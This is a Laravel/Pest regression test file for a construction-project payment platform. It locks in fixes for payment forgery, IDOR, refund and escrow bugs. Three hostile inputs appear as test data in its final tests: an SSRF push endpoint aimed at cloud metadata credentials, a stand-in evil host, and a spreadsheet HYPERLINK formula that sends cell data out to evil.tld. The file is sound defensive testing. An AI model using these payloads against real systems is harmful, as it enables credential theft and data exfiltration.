<?php

use App\Models\Arsitek;
use App\Models\Kontraktor;
use App\Models\Project;
use App\Models\ProjectPaymentTermin;
use App\Models\ProjectTerminAuthorizable;
use App\Models\ProjectTermination;
use App\Models\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;

uses(Tests\TestCase::class);

/*
|--------------------------------------------------------------------------
| Payment-integrity + authorization regression tests (2026-09-23)
|--------------------------------------------------------------------------
| Locks in the forgery/IDOR class of bugs found by the deep audit:
|   - TERMIN FORGERY: any professional could mint a payment stage on ANY
|     project with an arbitrary amount and themselves as recipient, then
|     self-verify it (recipient_id authorization) and write a ledger row.
|   - PROOF GATE: verifyProof accepted `action=accept` with no transfer
|     proof on file at all.
|   - REFUND TERMINAL: a refunded payment could be re-charged; the dedupe in
|     deductBudget then short-circuited WITHOUT writing a row.
|   - AMICABLE EXIT: `termination_pending` was not in the projects.status
|     ENUM, so initiate() 500'd and the freeze middleware was dead code.
|   - Missing authz: daily-logs, sub-professionals, requirement history
|     (no parent binding + any interior user), engineering-log delete.
|   - Per-user data under a shared cache key (?mine=true on houses).
|   - Budget mass-assignment by a hired professional.
|
| SAFETY MODEL: identical to MoneyIntegrityTest — real MySQL, explicit
| transaction, ALWAYS rolled back, DML only.
*/

beforeEach(function () {
    // Shared harness — see tests/Support/DatabaseHarness.php.
    Tests\Support\DatabaseHarness::boot();
});

afterEach(function () {
    Tests\Support\DatabaseHarness::rollback();
});

function piUser(string $suffix, string $role = 'user'): User
{
    return User::create([
        'name' => "PI {$suffix}",
        'username' => 'pi_' . $suffix . '_' . uniqid(),
        'email' => 'pi_' . $suffix . '_' . uniqid() . '@example.test',
        'password' => Hash::make('password123'),
        'role_type' => $role,
    ]);
}

/*
|--------------------------------------------------------------------------
| 1. Payment-stage forgery
|--------------------------------------------------------------------------
*/

it('refuses to let an unrelated professional mint a payment stage on a project', function () {
    $owner = piUser('term_owner');
    $stranger = piUser('stranger', 'kontraktor');
    $profile = Kontraktor::create(['user_id' => $stranger->id, 'nama' => 'Stranger']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 50_000_000, 'status' => 'in_progress']);

    $res = $this->actingAs($stranger, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payment-termins", [
            'label' => 'Forged DP',
            'percentage' => 50,
            'amount' => 40_000_000,
        ]);

    $res->assertStatus(403);
    expect(ProjectPaymentTermin::where('project_id', $project->id)->count())->toBe(0);
});

it('blocks the full forgery chain: mint, self-verify, no ledger row', function () {
    Mail::fake();
    $owner = piUser('chain_owner');
    $proUser = piUser('chain_pro', 'kontraktor');
    $profile = Kontraktor::create(['user_id' => $proUser->id, 'nama' => 'Chain']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 50_000_000, 'status' => 'in_progress']);

    // The attacker is NOT a participant: minting must fail.
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payment-termins", [
            'label' => 'Forged DP', 'percentage' => 50, 'amount' => 40_000_000,
        ])
        ->assertStatus(403);

    // Even if a stage exists (e.g. created by the owner), the attacker cannot
    // self-verify a payment with no transfer proof.
    $termin = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'DP', 'percentage' => 50,
        'amount' => 40_000_000, 'status' => 'pending', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);

    $res = $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payments/termin/{$termin->id}/verify-proof", ['action' => 'accept']);

    $res->assertStatus(422);
    expect($termin->fresh()->status)->not->toBe('paid');
    expect(\App\Models\ProjectBudgetTransaction::where('project_id', $project->id)->count())->toBe(0);
});

it('requires an uploaded proof and a verifying status before a payment can be accepted', function () {
    Mail::fake();
    $owner = piUser('proof_owner');
    $proUser = piUser('proof_pro', 'kontraktor');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 50_000_000, 'status' => 'in_progress']);

    // 1) no proof at all
    $noProof = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'A', 'percentage' => 50,
        'amount' => 5_000_000, 'status' => 'verifying', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payments/termin/{$noProof->id}/verify-proof", ['action' => 'accept'])
        ->assertStatus(422);

    // 2) proof present but not in the verifying state
    $notVerifying = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'B', 'percentage' => 50,
        'amount' => 5_000_000, 'status' => 'pending', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);
    $notVerifying->forceFill(['payment_proof_path' => 'receipts/x.png'])->save();
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payments/termin/{$notVerifying->id}/verify-proof", ['action' => 'accept'])
        ->assertStatus(422);

    // 3) both satisfied -> accepted
    $ok = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'C', 'percentage' => 50,
        'amount' => 5_000_000, 'status' => 'verifying', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);
    $ok->forceFill(['payment_proof_path' => 'receipts/y.png'])->save();
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payments/termin/{$ok->id}/verify-proof", ['action' => 'accept'])
        ->assertStatus(200);
    expect($ok->fresh()->status)->toBe('paid');
});

it('never lets a payment stage exceed the negotiated contract value', function () {
    $owner = piUser('bound_owner');
    $proUser = piUser('bound_pro', 'arsitek');
    $profile = Arsitek::create(['user_id' => $proUser->id, 'nama' => 'Bound']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 200_000_000, 'status' => 'in_progress']);
    $project->update(['selected_arsitek_id' => $profile->id]);

    // Accepted contract: Rp 50,000,000.
    \App\Models\BidArsitek::create([
        'project_id' => $project->id, 'arsitek_id' => $profile->id,
        'price' => 50_000_000, 'status' => 'accepted', 'payment_status' => 'unpaid',
    ]);

    // Sane stage is allowed.
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payment-termins", [
            'label' => 'DP 30%', 'percentage' => 30, 'amount' => 15_000_000,
        ])
        ->assertStatus(201);

    // Over-committing the plan must be refused.
    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payment-termins", [
            'label' => 'Huge', 'percentage' => 70, 'amount' => 90_000_000,
        ])
        ->assertStatus(422);
});

it('will not re-plan a stage that is already verifying or paid', function () {
    $owner = piUser('drift_owner');
    $proUser = piUser('drift_pro', 'kontraktor');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 100_000_000, 'status' => 'in_progress']);

    $termin = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'DP', 'percentage' => 30,
        'amount' => 10_000_000, 'status' => 'verifying', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);

    $this->actingAs($proUser, 'sanctum')
        ->putJson("/api/projects/{$project->id}/payment-termins/{$termin->id}", [
            'amount' => 90_000_000,
        ])
        ->assertStatus(422);

    expect((float) $termin->fresh()->amount)->toBe(10_000_000.0);
});

it('treats a refunded payment as terminal so it cannot be re-charged', function () {
    $owner = piUser('refund_owner');
    $admin = piUser('refund_admin', 'admin');
    $proUser = piUser('refund_pro', 'arsitek');
    $profile = Arsitek::create(['user_id' => $proUser->id, 'nama' => 'Ref']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 100_000_000, 'status' => 'in_progress']);

    $bid = \App\Models\BidArsitek::create([
        'project_id' => $project->id, 'arsitek_id' => $profile->id,
        'price' => 6_000_000, 'status' => 'active', 'payment_status' => 'unpaid',
    ]);

    // Owner settles it.
    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/budget/mark-paid", ['type' => 'bid_arsitek', 'id' => $bid->id])
        ->assertStatus(200);

    // Dispute + admin refund.
    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/disputes", [
            'category' => 'payment', 'title' => 'Refund me',
            'description' => 'Work never started.', 'payment_type' => 'arsitek_bid', 'payment_id' => $bid->id,
        ])
        ->assertStatus(201);

    $dispute = \App\Models\ProjectDispute::where('project_id', $project->id)->firstOrFail();

    $this->actingAs($admin, 'sanctum')
        ->postJson("/api/admin/disputes/{$dispute->id}/act", ['action' => 'record_refund', 'amount' => 6_000_000])
        ->assertStatus(200);

    expect($bid->fresh()->payment_status)->toBe('refunded');

    // Re-charging must be refused — otherwise deductBudget's dedupe silently
    // no-ops and money leaves the bank with no ledger record.
    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/budget/mark-paid", ['type' => 'bid_arsitek', 'id' => $bid->id])
        ->assertStatus(422);
});

/*
|--------------------------------------------------------------------------
| 2. Amicable exit / freeze
|--------------------------------------------------------------------------
*/

it('supports the amicable-exit lifecycle now that termination_pending is a real status', function () {
    $owner = piUser('exit_owner');
    $proUser = piUser('exit_pro', 'kontraktor');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/mutual-termination/initiate", ['reason' => 'Cannot agree on scope.'])
        ->assertStatus(200);

    // The status must be storable — previously this write raised MySQL 1265.
    expect($project->fresh()->status)->toBe('termination_pending');

    // And the freeze middleware must now actually block unrelated writes.
    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/disputes", [
            'category' => 'termination', 'title' => 'Blocked?', 'description' => 'x',
        ])
        ->assertStatus(422);
});

/*
|--------------------------------------------------------------------------
| 3. Authorization / IDOR
|--------------------------------------------------------------------------
*/

it('blocks non-participants from reading site logs and specialist rosters', function () {
    $owner = piUser('authz_owner');
    $stranger = piUser('authz_stranger');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    $this->actingAs($stranger, 'sanctum')
        ->getJson("/api/projects/{$project->id}/daily-logs")
        ->assertStatus(403);

    $this->actingAs($stranger, 'sanctum')
        ->getJson("/api/projects/{$project->id}/sub-professionals")
        ->assertStatus(403);

    // The owner is a participant and must still get through.
    $this->actingAs($owner, 'sanctum')
        ->getJson("/api/projects/{$project->id}/daily-logs")
        ->assertStatus(200);
});

it('scopes requirement history to its own project and rejects unhired interiors', function () {
    $ownerA = piUser('reqA_owner');
    $ownerB = piUser('reqB_owner');
    $stranger = piUser('req_stranger');
    $interior = piUser('req_interior', 'interior');
    \App\Models\InteriorProfile::create(['user_id' => $interior->id, 'nama' => 'Int']);

    $projectA = Project::create(['title' => 'A', 'user_id' => $ownerA->id, 'budget' => 10_000_000, 'status' => 'in_progress']);
    $projectB = Project::create(['title' => 'B', 'user_id' => $ownerB->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    $requirementB = \App\Models\ProjectRequirement::create([
        'project_id' => $projectB->id, 'name' => 'Semen', 'unit' => 'sak',
        'quantity_required' => 100, 'quantity_on_site' => 10,
    ]);

    // Owner A must not read project B's requirement history.
    $this->actingAs($ownerA, 'sanctum')
        ->getJson("/api/projects/{$projectA->id}/requirements/{$requirementB->id}/history")
        ->assertStatus(404);

    // An interior designer who is NOT hired on project B must not read it.
    $this->actingAs($interior, 'sanctum')
        ->getJson("/api/projects/{$projectB->id}/requirements/{$requirementB->id}/history")
        ->assertStatus(403);

    // Nor may a stranger restock another project's stock.
    $this->actingAs($stranger, 'sanctum')
        ->postJson("/api/projects/{$projectA->id}/requirements/{$requirementB->id}/restock", ['quantity' => 5])
        ->assertStatus(404);
});

it('only allows manual engineering logs to be deleted through the log endpoint', function () {
    $owner = piUser('log_owner');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    // project_milestones tracks `approval_status` / `is_completed` (no
    // `status` column). forceCreate because those write-path fields are
    // guarded in the controller rather than mass-assignable.
    $phaseMilestone = \App\Models\ProjectMilestone::forceCreate([
        'project_id' => $project->id, 'title' => 'PBG Permit', 'type' => 'permit',
        'is_completed' => 1, 'approval_status' => 'pending', 'phase_context' => 'build',
    ]);

    $this->actingAs($owner, 'sanctum')
        ->deleteJson("/api/projects/{$project->id}/engineering-logs/{$phaseMilestone->id}")
        ->assertStatus(400);

    expect(\App\Models\ProjectMilestone::where('id', $phaseMilestone->id)->exists())->toBeTrue();

    $manual = \App\Models\ProjectMilestone::forceCreate([
        'project_id' => $project->id, 'title' => 'Site note', 'type' => 'generic',
        'approval_status' => 'pending', 'phase_context' => 'build',
        'content' => ['is_manual_log' => true],
    ]);

    $this->actingAs($owner, 'sanctum')
        ->deleteJson("/api/projects/{$project->id}/engineering-logs/{$manual->id}")
        ->assertStatus(200);

    expect(\App\Models\ProjectMilestone::where('id', $manual->id)->exists())->toBeFalse();
});

it('stops a hired professional from rewriting the owner budget', function () {
    $owner = piUser('mass_owner');
    $proUser = piUser('mass_pro', 'kontraktor');
    $profile = Kontraktor::create(['user_id' => $proUser->id, 'nama' => 'Mass']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);
    $project->update(['selected_kontraktor_id' => $profile->id]);

    $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/update", [
            'budget' => 900_000_000,
            'deadline' => now()->addYear()->toDateString(),
        ])
        ->assertStatus(200);

    $project->refresh();
    expect((float) $project->budget)->toBe(10_000_000.0);
    expect($project->deadline)->toBeNull();
});

it('never serves one user another user private house listings', function () {
    $userA = piUser('houseA');
    $userB = piUser('houseB');

    $houseA = \App\Models\House::create([
        'name' => 'Rumah A RAHASIA', 'id_user' => $userA->id, 'price' => 1_000_000_000,
    ]);

    $res = $this->actingAs($userB, 'sanctum')
        ->getJson('/api/houses?mine=true');

    $res->assertStatus(200);
    $names = collect($res->json('data.data') ?? [])->pluck('name');
    expect($names)->not->toContain('Rumah A RAHASIA');
});

/*
|--------------------------------------------------------------------------
| 5. Escrow arithmetic (2026-09-23 money model)
|--------------------------------------------------------------------------
*/

it('moves the escrow ceiling when the owner adds funds', function () {
    $owner = piUser('funds_owner');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    $before = app(\App\Services\ProjectFinancialService::class)->available($project);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/budget/transactions", [
            'transaction_type' => 'deposit',
            'amount' => 40_000_000,
            'title' => 'Top up from client',
        ])
        ->assertStatus(200);

    $project->refresh();
    $financial = app(\App\Services\ProjectFinancialService::class);

    // The ceiling moved, so genuinely more money is payable. Previously a
    // deposit wrote only a ledger row, the UI advertised the funds and the
    // server still refused the payment with "Insufficient project budget".
    expect((float) $project->budget)->toBe(50_000_000.0);
    expect($financial->available($project))->toBe(50_000_000.0);
    expect($financial->available($project))->toBeGreaterThan($before);
});

it('refuses a payment stage that the escrow cannot cover', function () {
    Mail::fake();
    $owner = piUser('cover_owner');
    $proUser = piUser('cover_pro', 'kontraktor');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 1_000_000, 'status' => 'in_progress']);

    $termin = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'DP', 'percentage' => 50,
        'amount' => 9_000_000, 'status' => 'verifying', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);
    $termin->forceFill(['payment_proof_path' => 'receipts/over.png'])->save();

    $res = $this->actingAs($proUser, 'sanctum')
        ->postJson("/api/projects/{$project->id}/payments/termin/{$termin->id}/verify-proof", ['action' => 'accept']);

    $res->assertStatus(422);
    expect($termin->fresh()->status)->not->toBe('paid');
    // The ledger must not record money the escrow never held.
    expect(\App\Models\ProjectBudgetTransaction::where('project_id', $project->id)->count())->toBe(0);
});

it('never books a change order as two payable stages', function () {
    $owner = piUser('co_owner');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 100_000_000, 'status' => 'in_progress']);

    $order = \App\Models\ProjectChangeOrder::create([
        'project_id' => $project->id,
        'requested_by' => $owner->id,
        'role_type' => 'kontraktor',
        'title' => 'Extra reinforcement',
        'description' => 'Structural survey recommended more rebar.',
        'cost_impact' => 10_000_000,
        'status' => 'pm_reviewed',
    ]);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/change-orders/{$order->id}/owner-decide", ['action' => 'approve'])
        ->assertStatus(200);

    expect(ProjectPaymentTermin::where('project_id', $project->id)->count())->toBe(1);

    // A decided change order is terminal: re-deciding is refused outright.
    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/change-orders/{$order->id}/owner-decide", ['action' => 'approve'])
        ->assertStatus(422);

    expect(ProjectPaymentTermin::where('project_id', $project->id)->count())->toBe(1);
});

it('rejects a negative change order cost', function () {
    $owner = piUser('co_neg');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 10_000_000, 'status' => 'in_progress']);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/change-orders", [
            'title' => 'Credit me',
            'description' => 'Trying to inflate the remaining budget',
            'cost_impact' => -5_000_000,
        ])
        ->assertStatus(422);
});

it('voids unpaid payment stages when a professional is fired', function () {
    $owner = piUser('fire_owner');
    $proUser = piUser('fire_pro', 'kontraktor');
    $profile = Kontraktor::create(['user_id' => $proUser->id, 'nama' => 'Fired']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 100_000_000, 'status' => 'in_progress']);
    $project->update(['selected_kontraktor_id' => $profile->id]);

    $payable = ProjectPaymentTermin::create([
        'project_id' => $project->id, 'label' => 'DP', 'percentage' => 30,
        'amount' => 10_000_000, 'status' => 'pending', 'role_type' => 'kontraktor',
        'recipient_id' => $proUser->id,
    ]);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/terminate", [
            'role_type' => 'kontraktor',
            'reason' => 'Repeated no-shows on site.',
        ])
        ->assertStatus(200);

    // The stage is no longer payable, and the professional is off the project.
    expect($payable->fresh()->status)->toBe('void');
    expect($project->fresh()->selected_kontraktor_id)->toBeNull();
});

it('caps a refund at what is still refundable on the payment', function () {
    Mail::fake();
    $owner = piUser('partial_owner');
    $admin = piUser('partial_admin', 'admin');
    $proUser = piUser('partial_arsitek', 'arsitek');
    $profile = Arsitek::create(['user_id' => $proUser->id, 'nama' => 'Par']);
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 100_000_000, 'status' => 'in_progress']);

    $bid = \App\Models\BidArsitek::create([
        'project_id' => $project->id, 'arsitek_id' => $profile->id,
        'price' => 10_000_000, 'status' => 'active', 'payment_status' => 'unpaid',
    ]);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/budget/mark-paid", ['type' => 'bid_arsitek', 'id' => $bid->id])
        ->assertStatus(200);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/disputes", [
            'category' => 'payment', 'title' => 'Partial claim',
            'description' => 'Only part of the fee is owed.',
            'payment_type' => 'arsitek_bid', 'payment_id' => $bid->id,
            'disputed_amount' => 4_000_000,
        ])
        ->assertStatus(201);

    $dispute = \App\Models\ProjectDispute::where('project_id', $project->id)->firstOrFail();

    // More than the disputed amount is refused.
    $this->actingAs($admin, 'sanctum')
        ->postJson("/api/admin/disputes/{$dispute->id}/act", ['action' => 'record_refund', 'amount' => 9_000_000])
        ->assertStatus(422);

    // A partial refund is accepted and only partially reverses.
    $this->actingAs($admin, 'sanctum')
        ->postJson("/api/admin/disputes/{$dispute->id}/act", ['action' => 'record_refund', 'amount' => 4_000_000])
        ->assertStatus(200);

    $bid->refresh();
    expect((float) $bid->refunded_amount)->toBe(4_000_000.0);
    // Partial: the payment is NOT fully refunded, so it stays 'paid'.
    expect($bid->payment_status)->toBe('paid');

    $financial = app(\App\Services\ProjectFinancialService::class);
    expect($financial->available($project))->toBe(100_000_000.0 - 6_000_000.0);
});

it('refuses a refund that has no linked payment', function () {
    $owner = piUser('nolink_owner');
    $admin = piUser('nolink_admin', 'admin');
    $project = Project::create(['title' => 'P', 'user_id' => $owner->id, 'budget' => 50_000_000, 'status' => 'in_progress']);

    $this->actingAs($owner, 'sanctum')
        ->postJson("/api/projects/{$project->id}/disputes", [
            'category' => 'payment', 'title' => 'General grievance',
            'description' => 'No specific payment attached.',
        ])
        ->assertStatus(201);

    $dispute = \App\Models\ProjectDispute::where('project_id', $project->id)->firstOrFail();

    $this->actingAs($admin, 'sanctum')
        ->postJson("/api/admin/disputes/{$dispute->id}/act", ['action' => 'record_refund', 'amount' => 1_000_000])
        ->assertStatus(422);
});
/*
|--------------------------------------------------------------------------
| 7. Notification policy
|--------------------------------------------------------------------------
*/

it('never allows money or dispute notifications to be muted', function () {
    $user = piUser('prefs');
    $service = app(\App\Services\NotificationPreferenceService::class);

    // Blanket "muted everything" preference.
    $this->actingAs($user, 'sanctum')
        ->putJson('/api/notification-preferences', [
            'type' => null, 'channel' => 'webpush', 'enabled' => false,
        ])
        ->assertStatus(200);

    $muted = \App\Models\Notification::create([
        'user_id' => $user->id, 'type' => 'chat_message',
        'title' => 't', 'body' => 'b', 'data' => [],
    ]);

    // A muted ordinary type does not push.
    expect($service->shouldPush($muted))->toBeFalse();

    // A dispute always pushes, even with everything muted.
    $dispute = \App\Models\Notification::create([
        'user_id' => $user->id, 'type' => 'dispute_opened',
        'title' => 't', 'body' => 'b', 'data' => [],
    ]);
    expect($service->shouldPush($dispute))->toBeTrue();

    $payment = \App\Models\Notification::create([
        'user_id' => $user->id, 'type' => 'payment_verified',
        'title' => 't', 'body' => 'b', 'data' => [],
    ]);
    expect($service->shouldPush($payment))->toBeTrue();

    // And the API refuses to store a mute for them in the first place.
    $this->actingAs($user, 'sanctum')
        ->putJson('/api/notification-preferences', [
            'type' => 'dispute_opened', 'channel' => 'webpush', 'enabled' => false,
        ])
        ->assertStatus(422);
});

/*
|--------------------------------------------------------------------------
| 8. Privilege + platform hygiene
|--------------------------------------------------------------------------
*/

it('creates new professional profiles as pending, never pre-verified', function () {
    $payload = [
        'name' => 'New Arsitek',
        'username' => 'new_arsitek_' . uniqid(),
        'email' => 'new_arsitek_' . uniqid() . '@example.test',
        'password' => 'password123',
        'role_type' => 'arsitek',
    ];

    $res = $this->postJson('/api/register', $payload);
    $res->assertStatus(201);

    $user = User::where('email', $payload['email'])->firstOrFail();
    expect(optional($user->arsitek)->verification_status)->toBe('pending');
});

it('revokes active tokens when an admin suspends a user', function () {
    $admin = piUser('susp_admin', 'admin');
    $victim = piUser('susp_victim');
    $token = $victim->createToken('test')->plainTextToken;

    expect($victim->tokens()->count())->toBe(1);

    $this->actingAs($admin, 'sanctum')
        ->patchJson("/api/admin/users/{$victim->id}/suspend")
        ->assertStatus(200);

    expect($victim->fresh()->is_suspended)->toBeTrue();
    expect($victim->fresh()->tokens()->count())->toBe(0);
});

it('rejects push endpoints that are not real browser push services', function () {
    $user = piUser('push');

    $this->actingAs($user, 'sanctum')
        ->postJson('/api/push/subscribe', [
            'endpoint' => 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'keys' => ['p256dh' => 'a', 'auth' => 'b'],
        ])
        ->assertStatus(422);

    $this->actingAs($user, 'sanctum')
        ->postJson('/api/push/subscribe', [
            'endpoint' => 'https://evil.example.com/push/abc',
            'keys' => ['p256dh' => 'a', 'auth' => 'b'],
        ])
        ->assertStatus(422);

    $this->actingAs($user, 'sanctum')
        ->postJson('/api/push/subscribe', [
            'endpoint' => 'https://fcm.googleapis.com/fcm/send/abc123',
            'keys' => ['p256dh' => 'a', 'auth' => 'b'],
        ])
        ->assertStatus(200);
});

it('neutralizes spreadsheet formulas in the admin project export', function () {
    $admin = piUser('csv_admin', 'admin');
    $attacker = piUser('csv_attacker');
    \App\Models\Project::create([
        'title' => '=HYPERLINK("https://evil.tld/?d="&A1,"Click me")',
        'user_id' => $attacker->id,
        'budget' => 1_000_000,
        'status' => 'open',
    ]);

    $res = $this->actingAs($admin, 'sanctum')->get('/api/admin/projects/export');
    $res->assertStatus(200);

    $csv = $res->streamedContent() ?: $res->getContent();
    expect($csv)->toContain("'=HYPERLINK");
    // The dangerous leading '=' must never appear at the start of a cell.
    expect($csv)->not->toMatch('/(^|,)"?=HYPERLINK/m');
});
